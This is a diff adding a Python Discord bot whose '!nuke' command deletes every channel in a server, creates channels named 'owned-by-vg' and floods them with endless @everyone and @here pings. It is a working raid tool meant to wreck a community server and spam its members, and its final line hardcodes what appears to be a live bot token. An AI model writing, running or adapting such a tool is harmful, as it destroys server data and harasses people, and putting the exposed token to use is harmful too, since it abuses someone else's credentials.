@@ -1,0 +1,45 @@
+import discord
+import asyncio
+
+intents = discord.Intents.all()  
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    print("Bot is ready.")
+
+@client.event
+async def on_message(message):
+    if message.content.startswith('!nuke'):
+        
+        if message.guild.me.guild_permissions.manage_channels:
+            # Delete all channels in bulk
+            for channel in message.guild.channels:
+                await channel.delete()
+
+            
+            channels_to_create = [f"owned-by-vg-{i}" for i in range(1, 30)]
+
+            # Create channels at a rate of 4 channels per second
+            for i in range(0, len(channels_to_create), 6):
+                await asyncio.gather(*[message.guild.create_text_channel(name, topic="This channel is owned by vg") for name in channels_to_create[i:i + 4]])
+                await asyncio.sleep(0.01)# Introduce a delay for 4 channels per second
+
+            # Ping all channels concurrently
+            async def ping_channels():
+                created_channels = [channel for channel in message.guild.channels if channel.name.startswith("owned-by-vg")]
+                ping_tasks = [ping_channel(channel) for channel in created_channels]
+                await asyncio.gather(*ping_tasks)
+
+            await asyncio.gather(ping_channels())
+        else:
+            await message.channel.send("I don't have the necessary permissions to manage channels.")
+
+async def ping_channel(channel):
+    while True:
+        await channel.send("@everyone owned by vg lmao")  # Send a ping
+          # Reduced sleep interval for 5 pings per second
+        await channel.send("@here beamed by vg lmao")  # Send another ping
+        
+
+client.run('MTE4ODA0NzQzNDg5OTc4Nzc3Ng.GWquz-.oYKBdaJucg2NJqWSlSCRvtBU07xvPERXXT9FZ8')
